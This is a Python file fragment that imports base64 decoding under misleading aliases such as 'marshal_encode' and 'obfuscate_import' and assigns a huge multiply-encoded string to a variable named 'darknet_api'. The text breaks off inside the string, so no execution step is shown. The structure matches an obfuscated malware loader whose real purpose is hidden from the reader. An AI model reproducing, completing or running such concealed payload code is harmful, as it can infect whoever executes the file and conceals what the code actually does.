from base64 import b64decode as marshal_encode;from base64 import b64decode as zlib_compress;from base64 import b64decode as obfuscate_import;darknet_api = "V1ZaamVHUXlTWHBUYWtKS1VucHNObEV5Wkhka2JVNDFUbGh3YkZkRk5IZFhiR04zWWpCc2RGUnVUbUZXTUZvMVUxZHNjbE15U1hwVVdGWnFUVEo0TmxwRlpGZGtSWFJFVTI1a2FGZEZSalpUVldSelpGZE5lbFZ0YUdsU00yUnVWMWMxVGsxRmJIQmhNSFJwVFRBeE1WbDZUbk5sYlZKSVZtNVNURkV3Y0ROWlZtaENaV3RzU0dKSVZtcE5NVXB2V1d0a00xb3lUblJXYm1oclZqRmFObHBGYUU1aFZYUlNZMGhhYW1WVVZqWmFWbWhQVFVad1dFMUhPVXBpYTBwM1dUQlNUbG95UmxoT1dIQnJVakJhZWxsclRrTk5SbkJZWlVkNGExSXlhREpaYld4S1kwVk9ibU5ITVdwaVZHd3dVMVZvVTJKSFNraFdha0pvVW5wc01WTlZaSE5rUjA1SVQxaHNhMUV3U2xaWGJHUTBZa1p2ZWxOdGFHbFdWVFY2V1Zaa1YyUlhVa1JrTW1ScVRUSjRNVmRZYkROYU1YQlpWMjE0YVdKc1NqWlJNakZoWlZkSmVVMUhaR3RTTVZwNlYyeG9VMkl5U1hsT1NGWnJVak5rTVZkdE5WZGtWbXQ2Vlc1Q2FVMXFWalpVUnpCNFlrZE5lbFJ0YUdGTmJGbzJVMVZrYzJSSFRraFBXR3hyVVRCS1NWZHNhRk5UVjBaWlZHcENhVTB3YnpGV1Z6RlhaVWRTV0ZadWNHdFJNMlJ1VldwS1YwMUdSblJQVkVKU1RXdGFlbGxyWkV0aFJtdDVaRVZLYVdKck5IcFhiR2hMVlRGd1dWSnFSbUZYUlRSM1VUSXhZV1ZYU1hsTlIyUnJVakZhZWxkc2FGTmlNa2w1VGtoV1lWZEZjRFZaYWs1TFpXdHNTR0pJVW1wU2VtdzFXa1ZPUTFaR2NGbFVibkJvVm5wc01WWlZaRWRsYlUxNldraGFhbUpXU2xCWGJHUlhZVEZ3V0ZWcldtcGlhM0F5V1RKa2QySlhUblJQV0ZKS1VqQndObFJyVGtOalIwcFpVVzVhYW1Kc1JtNVZWekZYWVVkU1dWVnVRbUZpYkZwNlZsUkpOVTFYVGtKalJ6RnFZbFJzTUZOVmFGTmpSMHBZVmxka2FGWjZSak5aYWs1TFRVVnNTVlJ1VG1GV01Wb3pVVEl4YzJSSFRraFBXR3hyVVRCS05WZHNhRWROVm5CWlZHcENhbVZZWkc1WlZ6VlBaRzFLY0dReVpHcGlWbFo2VTFWb1QwNVhUak5qU0VKcFYwVktNbGt5TlZKYU1rcFpWbTVPYTFJeWVETlpNakExWVd4d1dWUnVjR2hXZWxaMVVUSXdNVTFYU2xoVGJYaHFZbXN4YmxWR1RrTlpiR2hTWTBoYWFtVlVWalphVm1oUFRVWndXRTFIT1VwaVZUVjZWMnhrUjJWVmJIQmhNSFJFWWxaS2MxZHRiRU5oVm14WVRsaFdZVmRGYkhaVE1WSjJVekJzUkZGWFpFcFNNSEJ2V1cwd01XSkhUbkJSVkd4S1VUQnNjRk5YWkhkWk1sWkZVbTFzV0dWclJUTlVXSEJDVGpBMVJWUnVVbTFTUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFRTFWVVpSZDA5V1FsVk5SR3hSVmtSQk5WVkdVWGRQVmtKVlRVUnNVVlpFUVRWYWExbzBUa1V4V0ZOdFNrNVNla0p1VTFWR2Qxa3lWa1ZTYld4WVpXdEZNMVJZY0VKT01EVkZWRzVTYlZKdVp6QlVWbVJMV1dzeFZXTXpjRTVoYmsxM1ZGVmpkMW93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hIWlVSU1RsWXdjR2xVVlZKNlpXc3hSV042UWs1V2VrWnBVMVZhUWxveFRrUlJhMUpLVVhwQ2JsWkdUa05SYTJ4R1l6SmtWRlV3U2tSVFZWVTBXakZhUkZGdFVsbFRSMlEwVjFkNGVtVkZPVFpVV0d4UVpXeEdNMWxzVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pGb1NWb3phRnBpU0U0elZETndUbVF3T1RaVldIQnBWMGhvYWxwVlVrZGhWbVEyVVc1U1JHSklaekJVVm1STFdXc3hSV016Y0U1U1NFMTNWRlJKZUU5R2FFbGFNMmhhWWtoT05sUXpjRTVsUlRrMlZWaGthVlV3Um01VFZVNUNXakJzUkZGWFpFcFJNRXBXV1ZWa2MyVnJiRWxVYlhCcVlsZDRNMXBGVGtOalIwNDFVVzVXYVUweFJtNVhiVEExWlZWc1NWUnRhR2xTTVZadVUxVk9RbG93YkVSUlYyUktVVEJHYmxkRmFHNWxSbXh6WXpOa1VHVnJNVE5VTTNCU1pXMUtXV1ZIVG14U1JWcHdWak53UTJSRlRuTmxSRkpPVmpCd2FWUlZVbnBsYXpGRlkzcENUazFxUlRSWFJXaHVaVVpzYzJNelpHbFdibWN3VkZaa1MxbHJNVVZqTTNCT1lXNU5kMVJWWTNkYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRlpOTVVwdldsWk9RMU5YU1hsTlYzaEtVMGhrYmxaVVRsTmhSMVpVVVd4U1dsWXhjSE5UVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFZGxSRkpPVmpCd2FWUlZZM2haTWxaRlVtMXNXR1ZyUlROVVdIQkNUakExUlZSdVVtMVNibWN3VkZaa1MxbHJNVWhOUlhSWlUwZGtORmRYZUhwa01EazJWRmhrVUdWc1JqWlpiR2d6VDFaQ1ZVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFRTFWVVpSZDA5V1FsVk5SR3hSVmtSQk5WVkdVWGRQVmtKWlpVZE9iRkpGV25CV00zQkRaRVZzUW1JeVpFcFJNRVp1VTFWT1Exa3lWa1ZTYld4WVpXdEZNMVJZY0VKT01EVkZWRzVTYlZKdVp6QlVWbVJMV1dzeFJXTXpjRTVTU0UxM1ZHcEpkMW93YkVSUmJVcEtVbXhLYzFsclpGZGliVTUwVW01U1NsSlZOWHBaVm1SUFkydHNSbE51V210Uk1FcFZWMVJPUzJOSFRrbFZWMlJaVlRCR2JsTlZXalJPUlRGWVUyMUtUbEpJVGpaVVZWSjZUVVV3ZVUxVWFGbFRSMlEwVjFkNGVtUXlTbEppTW1SS1VUQkdibE5WVGtOWk1sWkZVbTFzV0dWclJUTlVXSEJDVGpBMVJWUnVVbTFTYm1jd1ZGWmtTMWxyTVVWak0zQk9Va2hOZDFScVNYZGFNR3hFVVZka1dHVlZTazlhUm1RMFRVZEdWMUZ1YkdsTmF6VnpXWHBPVDJOSFNuUlpNbVJUVmpGS2QxcEZaSE5rYlVwd1VXMVNTbEV3Um01VFZWbzBUa1V4V0ZOdFNrNVNTRTQyVkZWU2VrMUZNSGxOVkdoWlUwZGtORmRYZUhwa01rcFNZakprU2xFd1JtNVRWVTVEV1RKV1JWSnRiRmhsYTBVelZGaHdRazR3TlVWVWJsSnRVWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNiVkp1WnpCVVZtUkxXV3N4U0UxRmRFcGhWV3h3VVRKc1Fsb3diRVJSYlRGcFRUQnNibGRVU205aFIwNXdVVzVDYVdGVlNuQlhWbU14WkZad1dWTlVXa1JoVlVadVUxVk9RbG93YkVSUlYyUnFUVEo0TmxSSE5VOU5SbkJJVDFSR2ExRjZWWHBaTWpGelRVWndWR0ZIY0doU01GbzFVekZHZGxvd2JFUlJWMlJLVVRCR2JsTlZhRTlPVjA0MVRsaHdhMUl4U2pKYVJtaFNaRlp3ZEdWRVJtcE5iV1IyVXpGR2Rsb3diRVJSVjJSS1VUQkdibE5WYUU5ak1YQllWbTVrVEZKRlJqRlVWVkpHWTBWT2JtSXlaRXBSTUVadVdWY3dOV05IU25GU1YyUlJWVEJHY0ZkRmFHNWxSbXh6WXpOa1VHVnJNVFZVTTNCU1pESktWRkZyZEdsTmJYZ3hVMVZqTldSVmJFZFZiWGhwVWpGYWRWa3lNVWRrUld4R1ZHMDVXbFo2VmpGWGJHUXpUbXRzU1ZWWVZtbFdNVll5VmxWV2IxSkdaM2hVYlhCcVlsZDRNMXBGV1RWV2JVNUlWVzFvYTFJeFdqWlhSV2h1WlVac2MyTXpaR2xWTUd4TVUxVk9RbG93YkVoalNGcG9WbnBTTlZOVlVYZGFNR3h3VVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5YWkhaYU1HeEVVVmRrWVdKVWJEVlRWVmswV2pKR1dFNUhaR3BpVlZveFYycEtWbUl3TVZSaGVscEVZVlZHYmxOVlRrSmFNR3hFVVZka2FsTkZjSGRaYlRWU1lqSkdkRTlZUW1saGExWjZWMnhqTVdFeFFsUlRiVTVxWVZWc2QxRXliRUphTUd4RVVWZGtTbEV3Um01WmVrbzBZa1p3V1ZGWE9VNVJlbEY0VXpGR2Rsb3diRVJSVjJSS1VUQkdibE5WYUVObFYwWllUbFJDVEZJelFqSlpWbU13WlZWNFNGWnVWbUZTUkVKd1YwVm9TbUZWZEZKaU1tUktVVEJHYmxOVlRrSmFNR3hKVkc1T1lWWXhXak5UTUZKQ1pGVTFWR0V3ZEVwUk1FWnVVMVZvUTJWWFJsaE9WRUpNVWpOQ01sbFdZekJsUlhoSVZtNVdZVkpFUW5CWFJXaEtZVlYwVW1Jd2RHaFdNV3h1V1cwd05VMUZiRWhQV0hCTlltdEtiMXBGWkc1a1ZuQlpZVWhDYWsweFNqWlRNRTVyWld4d1dWUnVjR2hXZW13eFUyNXNjazVyVG5CUlYyUktVVEJLTWxremF6RmtSbXhZWkVkNFlWSXllRFZaTTJ4dVltMU5lVlp1Y0dwTmJYZ3lXVzFzYW1ORlRtNWpSMnhhVm5wV01WZHNhRXBpTUhSU1lqQjBhRkl4V205WGEyUlhaVlZzUlUxSFpHeGxWVzk0V1hwS1YyVlZlRmhTYlRWaFZucFZkMU5YY0haaFZsSllUMVJhYUZZemFIcFhWazAwVFZWNGNWRlhaRXhTYlZKM1dXMHhVMlJ0VVhwVVYyUlZZa1pHYmxSV1VrSmtWVEZGWXpKa1YwMXRlREZVYlhCU1RqQnNTVnA2U2s5Uk1uUnVWVlpvUTJReVNraFdiR2hoVmpCd1RWbFdhRkprYXpWVlZGUk9UV0ZyTUhsVFZVNXZWRVpPUjFWck5WVlJNMlJ1V1d0a2MyTnNjRlJSYTJoaFZqQTFlVmx1YkhKYU1VVjVZVWhzYVUxcVJuTlVTSEJ1WlVWNGNWRllWazlTUlVWM1ZHdE5NR1ZGTVRaYU1tUldUV3RhZEZkV2FFdGpSWGcyVmxod1QyVlVValpVYld4TFQxVk9kRnBIZUd0VFJVcHZXWHBPVGxveFFsUlJibXhoVjBWWmVGZHNhRTlOUjA0MVRsYzFZVmRHUm5aVFZ6RnZUVWRTU1ZGdWNGQmhWR2d5V2tWa2IyRkhVa1JOVjNCcFVqSjRjVmxVU2t0a2JWSkVUa2hrVGxKRlNYcFhiR1JMWWpKSmVsUnFRbHBYUlVvelZFY3hUMlJ0U2xSUFZ6VmhWMFpLTTFkV2FFOWxhM2gwWVVSQ2FWWXpaSEJVUldSdllrWnNXRlZ0ZUdwaWF6QTFXVlZrVjJGR2NFaFdibXhNVlhwVmQxZHNhRzlOUlU1MVVXNXNhRlo2VlhkVE1FNUxXVEpLYzJWSVZsaGxXRUpyVTFWV2EySkhVa1JSYm1SYVYwVTFObHBFU1RWbFZuQkVVVzA1WVZkRmNITlRWVkoyV2pCc2NGRllTa3BUUlRSM1dUSnNiMkpzY0ZsVmJtUmFWMFUxTmxNeFRuSlRNazVJVW01d2FrMVViSHBaVm1NeFkydHNSVTFIWkdwaVZsbzBXa1prVjJWdFVrbFVXRlpoVFd4WmQxTXdUa3RpTWxKSlZXNWthbVZ0T1RKVVJFNVRZakZzV1ZWWVVscE5ibWgzVjFSS01HRlhTWHBWV0ZaT1VrVkdNMXBFU2xkaFYwWklUMWh3YTFJd1dqTlpNRTB4WVcxSmVVMUlXbXRYUlhCNlZFY3hiMDFIU2xoa01teE5VakpvYzFkV1pGTmlSMDUxVkZSc2FGSXhXbTlYYTJSWFpWVjBWRTVVUW1GWFIyZDNVVEkxYTJKR2JIQlJWR3hLVTBWd2Mxa3hhRmRpUjAxNlZXNXdUV0pYVW5OYVJVNXZaREZzV1ZSdWNGbE5ibWgzV1cweGVtTXlSa2hXYldoaFVqRmFOVmt6YjNoaU1YQllVbTEwWVZkRmJIZFJNalZEWVVadmVWWlhaRkZWTUVwRVYyeGtSMDFYVWtoaVJ6RnJWak5vVlZscVRsZGtNSFJKV2tkNFdtRlVWWGRYYkdodlRVVjRSRk50T1d0U2VrWjZWRWMxUTJGSFRuVlViWGhxWVZWc2QxRXlOVU5oUjAxNlZHcE9hVTB3Y0hKVFZWRjNXakpOZWxWdWJFeFRSVXB2VjJwS1ZtUldjSFJpU0ZaaFVUSmtjRmxWVWtaaFZYUlVZVEIwYWxJd1dqWlplazVyWkcxT2RGVlhaRkZWTUVvelYxWm9UMlZ0VVhsUFdHeGhVWHBXTlZkc2FFTmpNV3hZVkcxNFRGRXdhelJaVlZKR1N6QnNjR1F5YkVwaFYzUk1XVEJrUjJWdFRYcGFTRnBxWWxaR2JsVkdUa05rTVd4WlZHNXdhMDFxYkRWWGEwMHhaVlp3V1ZGdVRscFdNRFZ6VXpCT1NrOUZkM2xhTTJoUllWVnNlbE5YYkVwalJVNTFWbTV3WVZkRmNHMVpNR1JIWlcxT05WRlViRXBTTW5neFdUQm9WMDFGZEVSVGJVcE1Za1JDYmxWc1l6Rk5SbkJaVTFka2FrMXJOVFZaVm1oRFRVVnNTVkZ0YUdwTk1EUjZXV3BPUzJFd2JFVk9RM1JLVVRCc2QxRXlNWE5pVld4SlZtNXdZVmRGY0cxWk1HUkhaVzFPTlZGWGFGRlZNRW96VjFab1QyVnRVWGxQV0d4aFVrYzVURkV4YUVObFYwWllUbFJDVEZFd2NFdFpiVEZQWkcxT2RWTnRlRnBOTVVadVdUQmtSMlZ0VFhwYVNGcHFZbFpHYjFOVldsTmxWMVpVVVcxb1lVMXJXbmRaYldzd1dqQjRjRkZZVmtwaFYzUk1VVEZvVDA1WFRqVk9WM2hzVWpKM2QxTXdUbkpUTUU1MFQxaHdUV0pyTkRGWmVrNVRZa2RLVkZveWJGcE5ibWh6VjFab1NtRlZkRkpqUjJ4YVZucFdNVmRzYUVwaU1IUlNZakIwV2xkRlNuZFhSRXB6WVRCc1JVMUhaRXRsYTFZMlZGWlNibVF3T1VWV1Z6VkVZbFZhTTFsV1dUVmlNV3haVkcwNVNsSkVRbTVUYWtwV1pXczFjVlp0YUdGaGEzQjBWR3hTVjJGV2NFVldWRlphVFd4cmVsUnFTa2RoYXpSNVZGaG9UMUpIYzNoVU1WSkhZVEExU0ZWVVFrdGtNMEl6V1ZWak5XUldjRmRQV0ZaclZucEdjRmRzYUVwYU1VSlVVVzVDYVdKclNYaGFSVTV1WVZab1NFNVhTa3hpUkVKdVZXeGpNVTFHY0ZsVFYyUnNWbnByZUZreWJFTmtWMUpZVFZkc1lWZEZiRzVWUjI4d1dqRm9TVm96YUZwaVNFNHpXV3hPU21ORmJEVlpNMHBQWVdzd01WUnJVbFpPUlRWVlVsaHdVRkpGUmpOVGJtUjNZVzFLU0dKSGVHbGliRVp1VlVaT1ExWldjRmhsUjNoaFRUQndiMWxzVms5ak1rWllWbTVXYTFFeVpIVlpla3BYWlcxTmVXSklXbWxoVkdoMVUzcE9RMkl5U1hsT1YzaFpUV3BWZUZsc1pFdGlSMDV3WlVkb2FsSXllRzFaVm1SU1l6RnNXVkZ1UWxsTmJXaHZXWHBLYm1ORlRuUlViazVvVmpGYU1WcEZUVEZoYlVsNVRsaFdZVll3TkhkVE1FNXlVekpHV0ZkWFpHbGlWR3QzVTFWa1QyTXlSbGhXYmxaclVYcFdkMWw2UlRWTlYwMTVWbTVzV1UxcldYaGFSV1J2WkcxT2RHSkVXbUZXTVVaMlV6RlNkbE13VGxsVmJteHNWa2M1VEZFeFJuTmhiVXBJWWtkNGFXSnNSakZaZWtwWFpGWndSMDlYY0dsTmJFcHpWMFJPUzJKSFRsbFdiWGhxVFRGR2Rsa3daRzlrYlVwMFZtMWFhV0pzV2pCWFZ6RlhaVlYwVW1Jd2NFUldNRFY2V1Zaa1YyUlhVa1JPV0hCb1ZqSlNNVmRFU25Oa1ZYUkpVVzA1YVUxcVZuTlhSRWt4VFZkS1dGTnRlR3BoV0doM1dXMDFRMDFYVWtSYU1qVlpVMGRrTkZkWGVIcGtNRGsyVkZoc1VHVnNSak5aYkZwNlkxWm9WRkZyV21saWJFcHpXVEpzUTFaV2NGaGxSM2hoVFRCd2IxbHNUa05TUjBsNVZXMTRTbEpFVVhKVFZVNXFZMFYwVW1Jd2NHRlhSMmh4VjJ4b1EwMUZiRWRVYlhocVRUQTFkMWxxU1RGVlZteFpWRzV3YTAxcWJEVlhhMVV4WWtad1dGVnRlR0ZTVmxvMVdUSXdOV1ZWT1c1aU1IQkVWMFZLYjFsNlRrOU5Na2w2VTIxMFNsSkVRbTVaVm1NeFpESlNXVlZYT1V0TldHY3dWRlprUzFsck1VVmpNM0JPWVc1TmQxUlZZM2hTYlVwMVZXMTRhbUZWU2xKWFZtaFBaVzFSZVU5WWJHRlJNRVkxVjIweFJsb3hRbkZPUjJSTFpWZDBURkV4Um5Oa1JuQlVVVlJzU2xJd05YcFpWbVJYWkZkU1JFNVljR3RTTUZvMVdrVk9iMlF5UmtoUFdGWmhWbXBzTVZwR1kzaGhWbkJaVTFoT2FsSXdXalpaZWs1clpHMU9kRlZZUWtSYU0wSnlWMnhrV2xveGEzbGxSMmhvVm5wQ2RsZFhNRFZOUm1kNVZHMDVXbFo2VmpGWGJHUXpZMFU1Ym1JeVpFcFJNRVp1VjJwS05HUnNiSFJTYms1S1VqQTFlbGxXWkZka1YxSkNZakprU2xFd1JtNVhWRXB2WVVkS2RFNVhlR2xTYW10NFdYcEtWMlZYU25SU2JsSmhWVEJGTlZOVlpFdGtiVkpIVDFkd2FGSXdXakZaYlRGWFl6Qk9jRkZYWkVwUk1FcHhVMVZSZDFveVRuUldibWhyVmpGYU5scEZhRTVrVjAxNVZtNXdhazF0ZURKWmJXeHVZMFZPY0ZGWFpFcFJNRWw0VjFaT1FrOVZiRWxqTWpWclYwVTFjMWt5YTNoaFJtOTVWbTVXYTFFeVRUSlRWVTVyVkcxSmVtTklRbWxTTTJodlZFaHdWbVJWTVVSUlZ6bFhUVzE0TVZkcll6Vk5NazQxVVdzNVYxRXdSalJVVlUwd1pEQTVOVkZzYUdoV2VsRjVWR3RTZWxveVZrVlhWRUpNVlRCS1Exa3dhRU5qTVhCWFdrZDRXbUV6VW5kYVJVMDBUVlV4TmxrelZrNWxiR3h1VXpCV01GTldXa1pOVlRGTlVUQktlbGxXWkRCaVJXeEdXa2Q0V2sxdVVqSlRNVTVEVWtkR1NWTnVXbWxXTVZZeVZHNXdhbVJWTVVST1NIQlFVa1pyZUZSSGNFWmxWVEZFVVd4U1dsWXhjRzlaTWpGeVpHczFWVlJVVGsxaGF6QjVVMnBOZDFNd2JFUlJWMlJLVWpBMWRsZFdZekZrVm5CWVpVZGFZVlo2VlhkWlZtaFRUbFZzUlUxSFpGcE5ibWgzVjJ4ak1VMUZlSFJhUjNoclVtcHNjMWx0TlZOalIxSkpZVEk1V2sxdGFHOVpiVEF4WWtkS1IwOVVSbXBOYkZvMVdXMHhSMlJHY0ZSaE1IUktVVEJHYmxOVmFGTmxWMVpWWWpCMFNsRXdSbTVUVlU1Q1dqQnNSRkZ0TVdsTk1HeHVXa1prTkdGSFNuUlpNbVJvVm5wU2Jsa3lNVWRrVm05NVZsYzVVRlpIY3pGVU1WSnlUbFU1VldGNlZreFdSemxNVTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1rNUpVMjVDYVdKc1JuWlRha1kwVGtVeFdGTnRTazVTU0U0MlZGZHdlazFGTVVoTlYwcE1Za1JDYmxWdE1WZE5SbXQ1WVVoQ2FXSlhUbTVXYkZwTFZGVnNSRTFIWkV0bFZVWjVVMVZvVDAxSFRuQmhSMnhwVFRGS2JWZFVTbTloUjBwMFRsZDRhVkV5ZEhkUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWhVYms1b1ZqRmFNVnBGVFRGbGJIQllUbGQwV1UxcVJuTlplazVQWVVadmVWWlhPV0ZXZWxWM1dWWm9VMDVXUWxoVWJUbGFWbnBXTVZkc1pEUmFiSEJZVGxSQ2FGZEdTVEZVUldONFlrZE5lbFJ0YUdGTmJGVTFVMms1UkZwdGVIaFdWMlJYWWxkNE5sbFdhRkphTWsxNVlrUkNZVmRGTVhWVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSYm5CcFVqRmFjMWt3VG01bGEzUlNZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVvd1YyeG9UMlZzYkZoYVIzaFpUVzFvZDFsNlRsTmtiVTUxWVRKa1VWVXdTbkZaYTJSellrZEtkVlZYT1ZOTmJGbDNWVEJrYzJWdFVraFBXR3hzVm10d2Mxa3hhRmRpUjAxNlZWYzVhbEl4V25OWk1tOTRZVzFHU0ZKdVZtbGlWbHA2VjBSS1YyUlhVa2hpUkVKc1ZUTm9lbGxXWTNoalIxSkZUVWhrVFZKNmJIUlhiVFZQWWtkU1IwOVhkRnBYUmtwelZVWlZNV1J0U25SV1dFNXBUV3h3ZEZsNlNsZE5SbWQ1WWtkMFVWWkZSbnBaYkdSSFRrWm5lV0pIZEZGV1JVWjZXV3hrYzJSV1ozbGlSM1JSVmtWR2VsZFdaRk5oTVdkNVQxY3hZV0pyTlhOYVJWRjNaREI0U0dGSGFHcE5iV00xVkZWT2NtTkZUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xJd05YWlhWbU14WkZad1dHVkhXbWhXTVVadVZVWk9RMlJHY0ZsVWJuQmFWakpTYzFkRVNtOWpSMDE2Vlc1YWFtSnRkREZaYkdSWFpXMU5lVkp0TldGWFJUVnBWRlZaZDJSWFJsaFZWWFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WlZtUmFXakpLV0ZadWNHcE5hMXAxVjJ4Wk5XSXlSbGxVYWtKcFRUQnZNVlJITUhoaVIwMTZWRzFvWVUxc1dqWldNM0JEV2tWNGRFMVhlR3BOTURWdlYycEtWbVJXY0hSaVNGWmhVVEprZFZaVVNUVmxWMDUxWVROT1NsTkdTblpYYkdoTFlrVnNTRkp1YkdGVk1Fb3hXVzVzUTJSV2NGbFpNbVJhVmpGS05sTlZaRWROYkd4WVlraE9XbFl3Y0hwWGJFMHdZbXQwVkZGWGFGRlZNRVl3VkZaU2RsTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWV2hEWlZkR1dFNVVRa3hSTWxKcVdsVlNSMkZXWkRaVVZHUk9aV3RWTTFSclVrTmtSbVExWTBkU1NsSlZXbkpaTTJ4RFpWZFNXRTVIWkdsTk1WbDNVMVpPUTFaWFRuVmhNbVJhVmpKU2IxbFdZekJhTWtwSVVtcENZVmRGYkc1VVJrNUNZbXRzUkdNeVpHcE5NVW8xVXpCa1MyUnRVa2RQVjNCb1VqQmFNVmx0TVZkak1IUlVZVEIwU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVoVGJteGhWakJhZVZFeWJFSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNTVlp1YkdsUk1FVTFVMVZqZUdKSFRYcFViV2hoVFd4YWJWbFZaSE5sYlZKSVQxaHNiRlY2VmpCWGJHaFBaV3hzV0ZwSGVHcE5XRTR6VjBaTk1XVldjRmxSYms1c1ZtcHNNRmRXYUV0amJWSlpVVmhXYW1KVWEzcFpla1o2WkRGb1ZFNVhiR3RYUmtsM1dXcEpNV1ZzWkRaUmJWSk5ZbXhhTlZsclJuWmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZ1WkdwaVYzZ3hXa1ZPYm1Kc2FFbGFNMmhhWWtoT00xUXpjRTVsVlRrMlZWaGthVlp1VG5oWFJrNURWakpHV1ZSdVFtdFNNbmd4VjI1c1EwMUhSa2hXVjJSWFZtdHdUbE5WVFhkYU1IQTFVVmhLU2xORk5IZFpNbXh2WVZkSmVsVnRXbHBOYldodldXMHdNV0pIU2tSaE0wSkVXakk1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1RFpWVnNSVTFIWkZwbFZGWjFWMnhvVW1JeVVsbFRiazVOVWpKb2MxZFdaRk5pUjA1MVZGUnNhMVl3Vm5kUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWxVYmxwclYwVkdibFZHVGtOUk1YQllVbXBHYTFJeWVIUmFSbVEwVmtkSmVsWnVaRXhUUld3eFdrVmtWMDVIVWtSa01teG9VMFpLTUZsclRURmtNV3haVTI1d1lWZEZiSEJUTVVaMlV6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJvVmpGc2JsbDZTVFZOVjA1RVRsY3hhRlo2Vm5KVE1FNXJZVEpHV1ZkWE5VMVNNRFY2VjFab1QyVnNhRFpOUnpWaFpWUkdOVmRzWkU5aFIwNUpWVzF3YUZJd1ZuVlRNVTVEWTBkT05WRnJPV2xOYWxaelUxVmtSMlJXY0VSUmJuQnBUVEZhTTFSSE1XRmpSMHAwVlZjNVMwMXNTbmRhUjJ4cVl6SkdXRlZVYkV0TmJXaHpWMVprVTJGV2JGbFRWelZNVlRCS2Qxa3piRU5VTWtsNVRsZDRVRm95T1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJScVRXNW9jMWRzYUVKaU1ERndZVEIwU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVoTlYzaHFUVEExYjFkcVNsZGFiVVpJWWtod2ExSjZiRFZhVms1Q1QxVnNTRlJ1VG1oV01Wb3hXa1ZPYjFOR2NGbFZhMnhvVjBVMGQxbHFUa3RPVmxaMFZtNW9hMVl4V2paYVJVNXZaREZ3V0ZadWJGRldNRFYyVjFaak1XUldjRmhsUjFwaFZucFZkMWxXYUZOT1ZYaElaVWhDYVZZeWQzZFZSbEpHWXpKSmVWZHRNV3BOYkZsM1YwUktVMkZIVWtoV1ZHeFZZbFJzTVZkc1RqUmtiSEIwVjI1d1lWZEdTbTFaVm1SU1QxVXhSR1ZJVWxwWFIyaHRXVlprVWs5Vk1VUmxTRkpvVm5wV2JWbFdaRkpQVlRGRVpVZG9ZVkl4U20xWmFrcGhZbGROZVZacVFsRldSVVo2V1ZWa1IyVnRSa1ZOU0dSTVZUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBTZWtaeldYcE9UMkZHYjNsV1YyUlJWVEJLTUZkc2FFOWxiR3hZV2tkNFdVMXRhSGRaZWs1VFpHMU9kV0V6Vm1sV01WbzJXWHBLUjJKc2NGbFViVXBPVW1wQ01WbHNaRmRsYlUxNVVtMDFZVlZYT1c1VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJScVUwVndkMWx0TlZKaU1HeHpaVVJTVGxZd2NHbFVWVko2WldzeGNXTjZRazVTZWtacFV6SjNkMW93YkhCUldFcEtVbnBHYzFsNlRrOWhSbTk1Vmxka1RHVlZSbkJUVlUxM1dqQnNjRkZZU2twVFJUUjNXVEpzYjJGWFNYcFZiVnBhVFcxb2IxbHRNREZpUjBwRVlUTkNSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSYmtKaFlWVktNRmRzYUU5bGJHeFlXa2Q0V1UxdGFIZFplazVUWkcxT2RXRXpWbWxXTVZvMldYcEtSMkpzY0ZsVWJVcE9VbXBDTVZsc1pGZGxiVTE1VW0wMVlWVjZWblJaVm1NeFlUQjBSRnBHUm1sU01WcHZXWHBLVmxveVRYcFZiV2hzVlRCS01sbHRiR3BqUld4RVVsUnNTbEY2UWpSVFZXTTFaVlZzU0UxWGVHcE5NRFZ2VjJwS1YxcHRSa2hpU0hCclVucHNOVnBXVFRGa1JuQlpWRzV3V2xZeVVuTlpla1o2WkRGb1ZFNVlVbUZYUlRVMlYxWmthMkpGZUhSWGJrSnBZbFpHZGxOcVJuTmtiVkpVVVc1U2ExZEZOSGRUVldoUFRVWnNXV0V5TlV4Vk1FWnZWVVpPUW1SRk1WVmlNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRWwzV1ZaamVHSkhUbkJSVkd4S1UwVndjMVJITVdGalIwcDBWVzFvYVZJelpIWlpNbXhxWWpGamVHVkhkRTFpUkVKNFYwVmtVbU5yZEZSWk0wNXBWakZhTmxsNlNrZGliSEJVWVRCMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCS05